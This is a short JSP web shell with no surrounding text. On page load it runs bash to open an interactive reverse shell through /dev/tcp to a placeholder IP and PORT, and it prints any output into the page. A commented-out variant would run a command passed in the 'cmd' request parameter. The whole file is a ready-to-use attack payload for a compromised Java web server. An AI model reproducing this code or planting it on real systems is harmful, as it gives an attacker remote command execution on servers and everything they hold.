<%@ page import="java.io.*" %>
<%
   //String cmd = request.getParameter("cmd");
   String output = "";

      String s = null;
      try {
         //Process p = Runtime.getRuntime().exec(cmd);
         
         Runtime r = Runtime.getRuntime();
         Process p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/IP/PORT 0>&1"});
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s;
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   
%>

<pre>
<%=output %>
